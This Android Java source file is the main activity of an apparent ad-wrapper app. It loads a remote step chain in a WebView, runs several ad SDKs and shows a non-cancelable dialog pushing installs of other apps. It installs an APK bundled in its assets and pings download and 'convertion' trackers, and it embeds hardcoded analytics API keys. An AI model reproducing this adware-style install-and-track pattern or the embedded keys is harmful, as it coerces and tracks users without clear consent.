 /*
  * 
  */
 package com.interstitial.interstitialproject;
 
 
 import java.io.File;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.annotation.SuppressLint;
 import android.app.Dialog;
 import android.app.ProgressDialog;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.graphics.Color;
 import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.Window;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.widget.TextView;
 
 import com.flurry.android.FlurryAgent;
 import com.interstitial.interstitialproject.dao.SdkNetwork;
 import com.interstitial.interstitialproject.utils.ExternalPackage;
 import com.interstitial.interstitialproject.utils.HtmlHelper;
 import com.interstitial.interstitialproject.utils.IConstants;
 import com.interstitial.interstitialproject.utils.IntentAplicationFactory;
 import com.interstitial.interstitialproject.utils.JsonHelper;
 import com.interstitial.interstitialproject.utils.PackageHelper;
 import com.interstitial.interstitialproject.utils.PhoneHelper;
 import com.interstitial.interstitialproject.utils.SdkCallHelper;
 import com.interstitial.interstitialproject.utils.StorageUtils;
 import com.interstitial.interstitialproject.web.CustomWebClient;
 import com.interstitial.interstitialproject.web.URLHelperFactory;
 
 import com.jirbo.adcolony.AdColony;
 import com.vdopia.client.android.VDO;
 
 
 public class MainActivity extends BaseActivity implements IConstants, ICallback {
 	
 
 	/** Является ли internal-маркап первым по приоритету (true/false)*/
 	private boolean isInternalFirst;
 	
 	/** Показываем только первый sdk, или все (true/false) */
 	private boolean isShowOnlyFirst;
 	
 	/** Задание для разблокировки (true/false) */
 	private boolean isIncent;
 	
 	
 	/** Последний ли шаг? */
 	private boolean isLastStep;
 	
 	/** Текущий шаг */
 	private int stepNumber = 1;
 	
 	/** The sdk networks. */
 	private List<SdkNetwork> sdkNetworks;
 
 	private ExternalPackage mExternalPackage;
 
 	private String currentPackageName;
 	
 	private static final int INTENT_RESULT_INSTALL = 44;
 	
 	private WebView myWebView;
 	private Dialog d;
 	private String packName ="";
 	
 	private ProgressDialog progressDialog;
 	private CustomWebClient webViewClient;
 	
 	
 	@Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
         this.requestWindowFeature(Window.FEATURE_NO_TITLE);
         setContentView(R.layout.activity_main);
         
         initConfigs();
         initViews();
         
         String url = URLHelperFactory.createInstance().getChainUrl(stepNumber);
         myWebView.loadUrl(url);
     }
 	
 	private void initViews() {
         initWebView();
         initProgressView();
 	}
 
 	private void initConfigs() {
		
 		PhoneHelper.setContext(this);
         doFirstRun();
         
         currentPackageName = getApplicationContext().getPackageName();
        URLHelperFactory.init(currentPackageName, this);
       	mExternalPackage = new ExternalPackage(this,
       				EXTERNAL_PACKAGE_FILE_NAME, EXTERNAL_PACKAGE_ASSETS_PATH);
       		
       	SdkCallHelper.initSponsorPay(this);
               
         PhoneHelper.checkConnection();
         SdkCallHelper.adcolonyInit(MainActivity.this);
 	}
 
 	@SuppressLint("SetJavaScriptEnabled")
 	private void initProgressView() {
 		progressDialog = new ProgressDialog(this);
         progressDialog.setTitle(getString(R.string.progress_dialog_title));
         progressDialog.setMessage(getString(R.string.progress_dialog_message));
         progressDialog.setCancelable(false);
 	}
 
 	@SuppressLint("SetJavaScriptEnabled")
 	private void initWebView() {
 		myWebView = (WebView) findViewById(R.id.webView);
         myWebView.getSettings().setSupportZoom(false);
         myWebView.getSettings().setJavaScriptEnabled(true);
         myWebView.getSettings().setSupportMultipleWindows(true);
         myWebView.clearCache(true);
         
         myWebView.setInitialScale(100);
         myWebView.getSettings().setLoadWithOverviewMode(true);
         myWebView.getSettings().setUseWideViewPort(true);
         myWebView.setScrollBarStyle(WebView.SCROLLBARS_OUTSIDE_OVERLAY);
         myWebView.setScrollbarFadingEnabled(false);
         
         myWebView.setBackgroundColor(Color.TRANSPARENT);
         myWebView.getSettings().setLayoutAlgorithm(
         		WebSettings.LayoutAlgorithm.SINGLE_COLUMN);
         
         webViewClient = CustomWebClient.getInstance(stepNumber, this);
         myWebView.setWebViewClient(webViewClient);
         myWebView.getSettings().setLoadWithOverviewMode(true);
         myWebView.getSettings().setUseWideViewPort(false);
 	}
 
 	@Override
 	public void onAsyncFinishLoading(String html, String url){
 		
 		if (url.contains("#")){
 			installApplication();
 			return;
 		}
 	
 		String json = HtmlHelper.extractJson(html);
 		String markup = HtmlHelper.extractMarkup(html);
 		
 		Log.d("Interstitial", html);
 		Log.d("Interstitial", json);
 		Log.d("Interstitial", markup);
 		
 		isIncent = JsonHelper.getIncent(json);
 		
 		if (isIncent){
 			String[] params = JsonHelper.getIncentParams(json);
 			String incentText = params[0];
 			List<String> packages = JsonHelper.getPackages(json);
 			packName = "";
 			
 			for (String string : packages) {
 				if (!PackageHelper.isInstalled(string, MainActivity.this))
 					packName = string;
 			}
 			
 			if (!packName.equals("")){
 				initIncentDialog(packName, incentText);
 				d.show();
 			}
 		}
 		
 		sdkNetworks = JsonHelper.getSdkList(json);
 		if (sdkNetworks.size() != 0)
 			isInternalFirst = sdkNetworks.get(0).getName().equals("internal");
 		
 		isShowOnlyFirst = JsonHelper.getIsShowOnlyFirst(json);
 	
 		isLastStep = JsonHelper.checkLastStep(json);
 		
 		if (isLastStep){
 			SdkCallHelper.startSponsorPay(this);
 		}
 		
 		if (!isInternalFirst){
 			if (isShowOnlyFirst)
 				//если showlogic = first
 				SdkCallHelper.callSdk(sdkNetworks.get(0), MainActivity.this);
 			
 			else
 				//вызываем по порядку sdk
 			for (SdkNetwork sdk : sdkNetworks) {
 				SdkCallHelper.callSdk(sdk, MainActivity.this);
 			}
 		}
 		
 	}
 	
 	private void initIncentDialog(final String packName, String incentText) {
 
 		d = new Dialog(this);
 		d.setContentView(R.layout.dialog_offer);
 		TextView t = (TextView) d.findViewById(R.id.incentText);
 		t.setText(incentText);
 		d.findViewById(R.id.incentButton).setOnClickListener(new OnClickListener() {
 			@Override
 			public void onClick(View v) {
 				try {
 				    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id="+packName)));
 				} catch (android.content.ActivityNotFoundException anfe) {
 				    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id="+packName)));
 				}
 			}
 		});
 		d.setCancelable(false);
 	}
 
 	@Override
 	public void onBackPressed() {
         if(myWebView.canGoBack() == true){
         	myWebView.goBack();
         }else{
         	moveTaskToBack(true);
         	finish();
         }
 	}
 	
 	
 
     @Override
 	protected void onPause() {
 		super.onPause();
 		SharedPreferences settings = getSharedPreferences("PREFERENCE", MODE_PRIVATE);
 		SharedPreferences.Editor editor = settings.edit();
 		stepNumber = webViewClient.getStepNumber();
         editor.putInt("stepnumber", stepNumber);
         editor.commit();
         
 		AdColony.pause();
 	}
 
 	@Override
 	protected void onResume() {
 		super.onResume();
 		
 		if (d!=null && !packName.equals("") && PackageHelper.isInstalled(packName, this)){
 			d.dismiss();
 		}
 		
 		SharedPreferences settings = getSharedPreferences("PREFERENCE", MODE_PRIVATE);
 		stepNumber = settings.getInt("stepnumber", 1);
         webViewClient.setStepNumber(stepNumber);
 		AdColony.resume(this);
 		
 	}
 
 	@Override
 	protected void onStart() {
 		FlurryAgent.onStartSession(this, "V5QYFPPWPNWTQCZC5PBN");
 	    FlurryAgent.initializeAds(this);
 	    VDO.initialize("d8f54e64e2bda082b8c4b6dab91843c5", this);
 	    super.onStart();
 	}
 
 	@Override
 	protected void onStop()	{
 		super.onStop();		
 		FlurryAgent.onEndSession(this);
 	}
  
 
     private void doFirstRun() {
         SharedPreferences settings = getSharedPreferences("PREFERENCE", MODE_PRIVATE);
         if (settings.getBoolean("isFirstRun", true)) {
             SharedPreferences.Editor editor = settings.edit();
             editor.putBoolean("isFirstRun", false);
             editor.commit();
             Log.d("Interstitial", "download...");
             URLHelperFactory.createInstance().pingDownload();
         }
     }
     
     private void doLastRun(){
         if (!StorageUtils.checkIfExists(currentPackageName)){
         	StorageUtils.createEmptyFile(currentPackageName);
         	URLHelperFactory.createInstance().pingUnpack();
         }
     	
     }
     
     
 	public void installApplication(File file) {
 		Intent intent = IntentAplicationFactory.createIntentInstall(file);
 		startActivityForResult(intent, INTENT_RESULT_INSTALL);
 	}
 	
 	@Override
 	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
 	    
 	}
 
 	@Override
 	public void showProgress() {
 		progressDialog.show();
 		
 	}
 
 	@Override
 	public void unlockButton(int delay) {
 		final TimerTask task = new TimerTask() {
     		public void run() {
           	
     			Handler refresh = new Handler(Looper.getMainLooper());
     			refresh.post(new Runnable() {
     				public void run(){
     					progressDialog.dismiss();
     				}
     			});
             }
     	};
       
     	new Timer().schedule(task, delay);		
 	}
 
 	@Override
 	public void installApplication() {
 		installApplication(mExternalPackage.getFile());
 		Log.d("Interstitial", "convertion...");
 	    doLastRun();
 	}
 }
